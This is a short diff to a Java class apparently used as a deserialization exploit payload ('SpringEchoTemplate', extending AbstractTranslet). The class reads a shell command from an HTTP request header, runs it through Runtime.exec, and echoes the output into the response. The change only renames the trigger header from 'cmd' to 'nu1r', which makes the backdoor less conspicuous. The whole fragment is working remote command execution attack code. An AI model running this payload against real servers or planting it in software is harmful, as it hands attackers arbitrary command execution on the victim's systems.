@@ -19,7 +19,7 @@ public class SpringEchoTemplate extends AbstractTranslet {
             HttpServletRequest httprequest = ((ServletRequestAttributes) requestAttributes).getRequest();
             HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();
 
-            String cmd = httprequest.getHeader("cmd");
+            String cmd = httprequest.getHeader("nu1r");
             if(cmd != null && !cmd.isEmpty()){
                 String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                 httpresponse.getWriter().println(res);
